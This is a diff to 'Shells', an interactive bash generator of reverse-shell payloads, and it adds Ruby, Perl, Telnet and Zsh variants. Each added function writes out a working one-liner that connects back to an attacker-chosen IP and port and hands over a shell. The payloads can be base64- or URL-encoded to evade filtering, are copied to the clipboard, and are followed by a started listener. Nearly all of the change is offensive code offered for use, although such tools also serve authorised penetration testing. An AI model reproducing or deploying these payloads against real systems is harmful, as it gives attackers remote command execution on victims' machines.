@@ -1,7 +1,7 @@
 #!/bin/bash
 #By Andreas Finstad - 4ndr34z
 #Twitter handle: @4nqr34z
-#Shells v.1.2.1
+#Shells v.1.2.2
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -203,7 +203,6 @@ listen
 }
 
 
-
 function bash_i () {
 header
 rev="sh -i >& /dev/tcp/$IP/$PORT 0>&1"
@@ -229,7 +228,57 @@ fi
 listen
 }
 
+function ruby () {
+header
+rev="ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"$IP\",$PORT))'"
 
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+echo -n $rev | xclip -sel c
+fi
+listen
+}
+
+
+
+function perl () {
+header
+rev="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+echo -n $rev | xclip -sel c
+fi
+listen
+}
 
 function python () {
 header
@@ -272,7 +321,56 @@ listen
 }
 
 
+function telnet () {
+header
+rev="e=\$(mktemp -u);mkfifo \$e && telnet $IP $PORT 0<\$e | sh 1>\$e"
 
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+echo -n $rev | xclip -sel c
+fi
+listen
+}
+
+
+function zsh () {
+header
+rev="zsh -c 'zmodload zsh/net/tcp && ztcp $IP $PORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
+
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+echo -n $rev | xclip -sel c
+fi
+listen
+}
 
 #Listener
 function listen () {
@@ -362,7 +460,161 @@ Choose an option [1]:  "
 
 }
 
+submenu_ruby() {
+header
+    echo -ne "
+$(blueprint 'Ruby')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint '5)') Go Back to Main Menu
+$(redprint '0)') Exit
 
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        ruby 
+        ;;
+    2)
+        ruby "base64"
+        ;;
+    3)
+        ruby "url"
+        ;;
+    4)
+        ruby "urlx2"
+        ;;
+    5)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+submenu_telnet() {
+header
+    echo -ne "
+$(blueprint 'Telnet')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint '5)') Go Back to Main Menu
+$(redprint '0)') Exit
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        telnet 
+        ;;
+    2)
+        telnet "base64"
+        ;;
+    3)
+        telnet "url"
+        ;;
+    4)
+        telnet "urlx2"
+        ;;
+    5)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+submenu_perl() {
+header
+    echo -ne "
+$(blueprint 'Perl')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint '5)') Go Back to Main Menu
+$(redprint '0)') Exit
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        perl 
+        ;;
+    2)
+        perl "base64"
+        ;;
+    3)
+        perl "url"
+        ;;
+    4)
+        perl "urlx2"
+        ;;
+    5)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
+submenu_zsh() {
+header
+    echo -ne "
+$(blueprint 'Zsh')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(magentaprint '5)') Go Back to Main Menu
+$(redprint '0)') Exit
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        zsh
+        ;;
+    2)
+        zsh "base64"
+        ;;
+    3)
+        zsh "url"
+        ;;
+    4)
+        zsh "urlx2"
+        ;;
+    5)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
 
 
 submenu_bash() {
@@ -380,7 +632,7 @@ Choose an option:  "
     read -r -n 1 ans
     case $ans in
     1)
-        bash_i
+        bash_i 
         ;;
     2)
         bash_i "base64"
@@ -423,7 +675,7 @@ Choose an option:  "
     read -r -n 1 ans
     case $ans in
     1)
-        netcat
+        netcat 
         ;;
     2)
         netcat "base64"
@@ -514,6 +766,10 @@ $(greenprint '1)') Powershell
 $(greenprint '2)') Netcat
 $(greenprint '3)') Bash
 $(greenprint '4)') Python
+$(greenprint '5)') Ruby
+$(greenprint '6)') Perl
+$(greenprint '7)') Telnet
+$(greenprint '8)') Zsh
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -534,6 +790,22 @@ Choose an option:  "
     4)
         input
         submenu_python
+        ;;
+    5)
+        input
+        submenu_ruby
+        ;;
+    6)
+        input
+        submenu_perl
+        ;;
+    7)
+        input
+        submenu_telnet
+        ;;
+    8)
+        input
+        submenu_zsh
         ;;
     0)
         fn_bye
